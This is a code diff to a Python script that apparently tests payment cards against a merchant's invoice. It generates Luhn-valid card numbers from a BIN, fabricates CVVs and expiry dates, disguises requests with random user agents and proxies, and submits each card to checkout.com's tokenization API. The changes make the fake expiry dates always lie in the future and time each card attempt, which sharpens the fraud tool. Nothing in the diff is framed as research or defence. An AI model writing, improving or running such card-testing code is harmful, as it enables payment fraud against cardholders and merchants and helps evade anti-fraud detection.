@@ -4,6 +4,7 @@ import json
 import time
 from bs4 import BeautifulSoup
 from fake_useragent import UserAgent
+from datetime import datetime
 
 # Step 1: Get a random User-Agent
 ua = UserAgent()
@@ -46,11 +47,8 @@ else:
     proxies = None
     print("Proxy is not working. Running without proxy.")
 
-
 # The user input invoice and card details
 invoice = input('Enter Invoice URL: ').strip()
-
-start_time = time.time()  # Measure the start time
 
 # Function to calculate Luhn digit
 def calculate_luhn_digit(number):
@@ -92,9 +90,23 @@ def generate_cvv_and_expiry(bin_cc):
     # Adjust CVV length based on card type (AMEX has 4 digits)
     cvv_length = 4 if bin_cc[0] == "3" else 3
     cvv = ''.join([str(random.randint(0, 9)) for _ in range(cvv_length)])
-    rand_month = random.randint(1, 12)
+    
+    # Get current date
+    current_date = datetime.now()
+    current_year = current_date.year
+    current_month = current_date.month
+
+    # Generate a valid expiration date (month and year)
+    while True:
+        rand_month = random.randint(1, 12)
+        rand_year = random.randint(current_year, current_year + 14)  # Up to 14 years in the future
+        
+        # Ensure the generated date is in the future
+        if rand_year > current_year or (rand_year == current_year and rand_month > current_month):
+            break
+
     mes = f"{rand_month:02}"
-    ano = random.randint(2025, 2039)
+    ano = rand_year
     return cvv, mes, ano
 
 # Step 2: Make a GET request to the provided URL with specific headers
@@ -203,6 +215,8 @@ if pk and ps:
     for card_number in cards_list:
         # Generate random CVV and expiration date for each card
         cvv, mes, ano = generate_cvv_and_expiry(BIN_CC)
+
+        start_time = time.time()  # Measure the start time
 
         # Tokenization request
         token_url = "https://api.checkout.com/tokens"
